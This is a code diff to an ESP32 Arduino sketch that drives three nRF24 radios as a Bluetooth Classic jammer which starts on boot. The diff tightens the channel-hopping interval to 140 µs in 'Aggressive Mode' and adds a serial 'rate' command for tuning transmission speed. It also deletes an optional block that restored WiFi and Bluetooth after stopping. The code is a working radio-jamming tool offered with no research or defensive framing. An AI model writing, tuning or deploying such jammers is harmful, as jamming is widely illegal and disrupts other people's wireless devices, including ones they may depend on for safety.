@@ -1,15 +1,14 @@
 /*
  * esp32-nrf24-bt-jammer.ino
  * Bluetooth Classic Jammer – Auto‑start on boot.
- * Commands: start, stop, status, toggle, help
+ * 
+ * Timing: 140 µs hopping + 10 µs CPU rest = 150 µs per cycle.
+ * Commands: start, stop, status, toggle, help, rate <us>
  *
- * Features:
- * - Dynamic channel generation (no static tables)
- * - Proper radio init with error handling
- * - Blocking transmit with txStandBy(timeout)
- * - Packet counter (volatile, no mutex needed)
- * - Lower task priority (10) for stability
- * - Clean shutdown with forced fallback
+ * Pin Assignments:
+ *   Radio A: CE=4,  CSN=16
+ *   Radio B: CE=5,  CSN=17
+ *   Radio C: CE=22, CSN=21
  */
 
 #include <Arduino.h>
@@ -38,7 +37,7 @@ static RF24 RadioC(NRF_CE_PIN_C, NRF_CSN_PIN_C);
 static const uint8_t CH_MIN = 0;
 static const uint8_t CH_MAX = 78;
 static const uint8_t PAYLOAD_SIZE = 32;
-static const uint32_t TX_DELAY_US = 180;   // micro seconds between cycles
+static uint32_t TX_DELAY_US = 140;   // hopping interval
 
 // ─── Global State ──────────────────────────────────────────
 static volatile bool _btActive = false;
@@ -73,7 +72,7 @@ static void jammerTask(void* pv) {
 
   uint8_t chA = CH_MIN;
   uint8_t chB = CH_MAX;
-  uint8_t chC = CH_MIN + 26;   // spread across band
+  uint8_t chC = CH_MIN + 26;
 
   bool powered = false;
 
@@ -92,7 +91,6 @@ static void jammerTask(void* pv) {
       if (initRadio(RadioA) && initRadio(RadioB) && initRadio(RadioC)) {
         powered = true;
       } else {
-        // Power down and retry later
         RadioA.powerDown();
         RadioB.powerDown();
         RadioC.powerDown();
@@ -117,10 +115,13 @@ static void jammerTask(void* pv) {
     bool okB = RadioB.writeFast(_junk, PAYLOAD_SIZE);
     bool okC = RadioC.writeFast(_junk, PAYLOAD_SIZE);
 
-    // Wait for all to finish (with 10ms timeout to avoid hanging)
-    RadioA.txStandBy(10);   // 🔥 timeout added
+    // Wait for all transmissions to finish (with timeout)
+    RadioA.txStandBy(10);
     RadioB.txStandBy(10);
     RadioC.txStandBy(10);
+
+    // 🔥 10 µs CPU rest – gives ESP32 breathing room
+    esp_rom_delay_us(10);
 
     // Count successes
     _btPacketCount += (okA ? 1 : 0) + (okB ? 1 : 0) + (okC ? 1 : 0);
@@ -130,7 +131,7 @@ static void jammerTask(void* pv) {
     chB = (chB - 2 + (CH_MAX + 1)) % (CH_MAX + 1);
     chC = (chC + 3) % (CH_MAX + 1);
 
-    // Main loop delay (adjustable – affects aggression)
+    // 🔥 140 µs hopping interval
     esp_rom_delay_us(TX_DELAY_US);
   }
 
@@ -180,7 +181,7 @@ bool startBtJammer() {
     "bt_jammer",
     4096,
     NULL,
-    10,            // priority
+    10,
     &_btJammerTaskHandle,
     0
   );
@@ -215,17 +216,6 @@ bool stopBtJammer() {
     Serial.println("! Forced task deletion");
   }
 
-  // (Optional) Re‑initialise WiFi and BT to restore normal operation
-  // Uncomment the block below if you want the ESP32 to be able to use WiFi/BT
-  // after stopping the jammer. Note: This may require additional setup
-  // (e.g., esp_bt_controller_enable, esp_bluedroid_enable) to fully work.
-  /*
-  Serial.println("Attempting to restore WiFi/BT...");
-  esp_bt_controller_init();
-  esp_wifi_init();
-  esp_wifi_start();
-  */
-
   Serial.println("> Jammer stopped");
   return true;
 }
@@ -238,13 +228,15 @@ bool btJammerToggle() {
   return btJammerIsActive() ? stopBtJammer() : startBtJammer();
 }
 
-// ─── Arduino Setup / Loop ──────────────────────────────────
+// ─── Setup / Loop ──────────────────────────────────────────
 void setup() {
   Serial.begin(115200);
   delay(500);
 
-  Serial.println(F("\nESP32 BT Jammer – Aggressive, Auto‑start"));
-  Serial.println(F("Commands: start, stop, status, toggle, help"));
+  Serial.println(F("\nESP32 BT Jammer – Aggressive Mode"));
+  Serial.println(F("Timing: 140 µs hopping + 10 µs rest = 150 µs"));
+  Serial.println(F("Pins: A(4,16) B(5,17) C(22,21)"));
+  Serial.println(F("Commands: start, stop, status, toggle, help, rate <us>"));
 
   if (startBtJammer()) {
     Serial.println(F("> Auto‑start succeeded."));
@@ -270,7 +262,15 @@ void loop() {
       btJammerToggle();
       Serial.printf("> Toggled. Now %s\n", btJammerIsActive() ? "ACTIVE" : "INACTIVE");
     } else if (cmd == "help") {
-      Serial.println(F("Commands: start, stop, status, toggle, help"));
+      Serial.println(F("Commands: start, stop, status, toggle, help, rate <us>"));
+    } else if (cmd.startsWith("rate ")) {
+      uint32_t newDelay = cmd.substring(5).toInt();
+      if (newDelay >= 10 && newDelay <= 1000) {
+        TX_DELAY_US = newDelay;
+        Serial.printf("> Rate set to %u µs\n", TX_DELAY_US);
+      } else {
+        Serial.println("! Invalid rate. Use 10–1000 µs.");
+      }
     } else if (cmd.length() > 0) {
       Serial.println(F("Unknown. Type 'help'."));
     }
